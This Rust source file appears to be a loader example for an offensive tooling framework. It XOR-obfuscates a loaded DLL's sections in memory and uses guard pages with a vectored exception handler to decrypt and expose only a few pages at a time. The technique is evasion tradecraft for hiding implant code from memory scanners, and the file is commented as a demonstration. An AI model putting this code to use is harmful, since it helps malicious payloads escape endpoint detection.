#![no_std]
#![no_main]

use core::{ptr::{null, null_mut}, slice::{from_raw_parts_mut}};

use crystal_palace_rs::{import, mem::{memcpy, memset}};
use crystal_palace_sys::tcg::{DLLDATA, SizeOfDLL, dprintf};
use winapi::{shared::{basetsd::{SIZE_T, ULONG_PTR}, minwindef::{DWORD, FALSE, LPCVOID, LPVOID, PDWORD, ULONG}, ntdef::{HANDLE, LONG, PVOID, VOID}, ntstatus::STATUS_GUARD_PAGE_VIOLATION}, um::winnt::{EXCEPTION_POINTERS, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_GUARD, PAGE_READWRITE, PVECTORED_EXCEPTION_HANDLER}, vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH}};

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

import!(KERNEL32!AddVectoredExceptionHandler(First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER) -> PVOID);
import!(KERNEL32!FlushInstructionCache(hProcess: HANDLE, lpBaseAddress: LPCVOID, dwSize: SIZE_T) -> i32);
import!(KERNEL32!GetCurrentThreadId() -> DWORD);
import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(KERNEL32!VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD) -> i32);
import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, dwFreeType: DWORD) -> i32);
import!(KERNEL32!ExitThread(dwExitCode: DWORD) -> VOID);

const MAXVISIBLE: usize = 3;
const MAXREGIONS: usize = 16;

#[repr(C)]
#[derive(Copy)]
#[derive(Clone)]
pub struct GUARDREGION {
    pub start: ULONG_PTR,
    pub end: ULONG_PTR,
    pub permissions: DWORD,
    pub source: *const i8, 
}

#[repr(C)]
pub struct REGIONQUEUE {
    pub pages: [*mut i8; MAXVISIBLE],
    pub index: i32,
}

// default init globals
static mut REGIONS: [GUARDREGION; MAXREGIONS] = [GUARDREGION{start: 0, end: 0, permissions: 0, source: null()}; MAXREGIONS];
static mut STATE: REGIONQUEUE = REGIONQUEUE{ pages: [null_mut(); MAXVISIBLE], index: 0 };

fn oldest_page() -> *mut i8 { unsafe { STATE.pages[STATE.index as usize % MAXVISIBLE] } }

fn track_page(page: usize) {
    unsafe {
        let mut old_prot = 0u32;

        if !oldest_page().is_null() {
            dprintf(c"drop  page %p".as_ptr() as _, oldest_page());
            VirtualProtect(oldest_page() as _, 0x1000, PAGE_READWRITE, &mut old_prot);
            memset(oldest_page() as _, 0, 0x1000);
            VirtualProtect(oldest_page() as _, 0x1000, PAGE_READWRITE | PAGE_GUARD, &mut old_prot);
        }
        STATE.pages[STATE.index as usize % MAXVISIBLE] = page as _;
        //dprintf(c"ADD   %p at index %d".as_ptr() as _, oldest_page(), state.index);

        STATE.index = (STATE.index + 1) % MAXVISIBLE as i32;
    }
}

/* add a region to guard! */
fn add_guard_region(payload: &[u8], src: *const u8, permissions: u32) {
    unsafe {
        for x in 0..MAXREGIONS {
            if REGIONS[x].start == 0 && REGIONS[x].end == 0 {
                dprintf(c"Setting up shop in %d for %p (%d) perms %d (SRC: %p)".as_ptr() as _, x, payload.as_ptr(), payload.len(), permissions, src);

                REGIONS[x].start = payload.as_ptr() as _;
                REGIONS[x].end = payload.as_ptr() as usize + payload.len();
                REGIONS[x].source = src as _;
                REGIONS[x].permissions = permissions;
                return;
            }
        }
        dprintf(c"No empty guard regions!".as_ptr() as _);
    }
}

/* grab our guard region */
fn get_guard_region(address: usize) -> *const GUARDREGION {
    unsafe {
        for x in 0..MAXREGIONS {
            if address >= REGIONS[x].start && address < REGIONS[x].end {
                return &REGIONS[x];
            }
        }
        null()
    }
}

/*
 * a global variable with our xorkey, we're going to set this to a random value via
 * our loader.spec to demonstrate the 'patch' command applied to COFFs. Note, we set
 * this to a value, because 'patch' can't update an unintialized value.
 */
#[unsafe(no_mangle)]
static xorkey: [u8;128] = [1; 128];

/*
 * A simple routine to obfuscate and de-obfuscate memory with our payload stream data.
 */
fn applyxor(data: &mut [u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= xorkey[i % 16];
    }
}

/*
 * Our VEH to response to page accesses and stream in content.
 */
unsafe extern "system" fn veh_handler(p_exception_ptrs: *mut EXCEPTION_POINTERS) -> LONG {
    unsafe {
        let exception_record = &*(*p_exception_ptrs).ExceptionRecord;
        let exception_addr;
        let page;
        let mut old_prot = 0u32;
        let guard;
        let src_addr;

        /*
        * I break for guard pages.
        */
        if exception_record.ExceptionCode != STATUS_GUARD_PAGE_VIOLATION as _ || exception_record.NumberParameters < 2  {
            return EXCEPTION_CONTINUE_SEARCH;
        }

        /* pull the needed info out of the arguments */
        exception_addr = exception_record.ExceptionInformation[1];
        page = from_raw_parts_mut((exception_addr - (exception_addr % 0x1000)) as *mut u8, 0x1000);

        /* check if the exception occurred somewhere within our regions we're tracking */
        guard = get_guard_region(exception_addr);
        if guard.is_null() {
            dprintf(c"The exception occurred elsewhere: %p".as_ptr() as _, exception_addr);
            return EXCEPTION_CONTINUE_SEARCH;
        }

        if (*guard).permissions == PAGE_EXECUTE_READ {
            dprintf(c"LOAD  EXEC %p".as_ptr() as _, page.as_ptr());
        } else {
            dprintf(c"LOAD  DATA %p".as_ptr() as _, page.as_ptr());
        }

        /* make our target page writeable... */
        src_addr = (*guard).source as usize + (page.as_ptr() as usize - (*guard).start);
        VirtualProtect(page.as_ptr() as _, page.len(), PAGE_READWRITE, &mut old_prot);

        /* stream in ONE page of content from our payload */
        memcpy(page.as_ptr() as _, src_addr as _, page.len());

        /* unmask the page's contents */
        applyxor(page);

        /* change the protection of our streamed in page to the permissions we want */
        VirtualProtect(page.as_ptr() as _, page.len(), (*guard).permissions, &mut old_prot);

        /* this seems like a REALLY good idea here */
        FlushInstructionCache(-1 as _, page.as_ptr() as _, page.len());

        /* this seems like a REALLY good idea here */
        track_page(page.as_ptr() as _);

        /* yeap, the exception is expected and handled... return to our code that was executing as if nothing happened */
        EXCEPTION_CONTINUE_EXECUTION
    }
}

fn guard_sections(dll: &DLLDATA, dst: *mut u8, src: *const u8) {
    unsafe {
        let num_of_sections = (*dll.NtHeaders).FileHeader.NumberOfSections;
        let mut section_hdr;
        let mut old_prot = 0u32;

        /* our first section! */
        section_hdr = (dll.OptionalHeader as usize + (*dll.NtHeaders).FileHeader.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;

        for _ in 0..num_of_sections {
            let va = (*section_hdr).VirtualAddress as usize;
            let perms;
            let src = from_raw_parts_mut((src as usize + va) as *mut u8, *(*section_hdr).Misc.VirtualSize() as _);
            let dst = from_raw_parts_mut((dst as usize + va) as *mut u8, *(*section_hdr).Misc.VirtualSize() as _);

            /*
             * It's a bad idea to take our writeable memory and subject it to streaming. This will lead to some serious
             * confusion as variable updates, suddenly, become corrupted or aren't taking. Why? Because our stream src
             * is treated as a read-only/constant thing. This implementation doesn't patch updated content in a page
             * back into the stream src for retrieval later. It could, but I didn't feel like going there for now.
             */
            if (*section_hdr).Characteristics & IMAGE_SCN_MEM_WRITE == IMAGE_SCN_MEM_WRITE {
                memcpy(dst.as_mut_ptr(), src.as_ptr(), src.len());
                section_hdr = section_hdr.add(1);
                continue;
            }

            if (*section_hdr).Characteristics & IMAGE_SCN_MEM_EXECUTE == IMAGE_SCN_MEM_EXECUTE {
                perms = PAGE_EXECUTE_READ;
            } else {
                perms = PAGE_READWRITE;
            }

            /* since we're guarding this region, let's "obfuscate" the contents in our stream src */
            applyxor(src);

            /* register this region of memory (and its permissions) in our guard table */
            add_guard_region(dst, src.as_ptr(), perms);

            /* And, the real magic, setting up guard pages */
            VirtualProtect(dst.as_ptr() as _, dst.len(), PAGE_READWRITE | PAGE_GUARD, &mut old_prot);

            /* advance to our next section */
            section_hdr = section_hdr.add(1);
        }
    }
}

/* Set our guard exec shit up */
#[unsafe(no_mangle)]
extern "C" fn go(data: &mut DLLDATA, dst_dll: *mut u8) {
    unsafe {
        let len = SizeOfDLL(data) as usize;      /* get our DLL size */
        let stream_src;

        /* our regions and state queue are already init because rust forces init for statics */
        
        /* allocate our memory where our obfuscated, ready to restore, payload content will live */
        stream_src = VirtualAlloc(null_mut(), len,MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

        /* copy our payload content over to it! */
        memcpy(stream_src as _, dst_dll, len);

        /* set all of our sections to NULL, for now */
        memset(dst_dll, 0, len);

        /* Now, we will walk the DLL, section by section, and setup guard regions and hints in our
         * global table keeping track of these things */
        guard_sections(data, dst_dll, stream_src as _);

        /* install the handler as our global VEH */
        AddVectoredExceptionHandler(FALSE as _, Some(veh_handler));
    }
}